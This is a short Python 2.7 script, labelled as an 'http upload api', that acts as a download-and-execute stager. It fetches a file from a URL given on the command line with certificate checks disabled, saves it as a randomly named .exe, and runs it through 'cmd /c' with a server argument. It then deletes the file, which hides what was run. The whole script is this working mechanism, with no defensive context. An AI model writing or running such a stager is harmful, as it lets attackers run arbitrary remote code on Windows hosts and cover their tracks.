#! /usr/bin/env python2.7
# -*- coding: utf-8 -*-

import os
import requests
import argparse
import random
import string

def s_rangdom():
    return ''.join(random.sample(string.ascii_letters + string.digits,8))

def get_FileSize(filePath):
    fsize = os.path.getsize(filePath)
    fsize = fsize / float(1024 * 1024)
    return round(fsize, 2)

def HTTPdownload(url, filename='output.txt'):
    '''
    下载接口
    :param url:
    :param filename:
    :return:
    '''
    requ = requests.get(url, stream=True, verify=False)
    with open(filename, 'wb') as fd:
        for chunk in requ.iter_content(chunk_size=5120):
            if chunk:
                fd.write(chunk)
    return filename

def check(localfile,server):
    if get_FileSize(localfile) != 0:
        command = 'cmd /c ' + localfile + " -d {server}".format(server=server)
        print command
        os.system(command)

if __name__ == '__main__':

    parse = argparse.ArgumentParser(description="http upload api")
    parse.add_argument('-d', '--domain', type=str, help="http clinet download")
    parse.add_argument('-u', '--upload', type=str, help="http server upload")
    args = parse.parse_args()

    domain = args.domain
    Server = args.upload
    filename = s_rangdom() + '.exe'
    if not args.domain:
        parse.print_help()
        exit()
    else:
        check(HTTPdownload(domain,filename),Server)
        os.remove(filename)






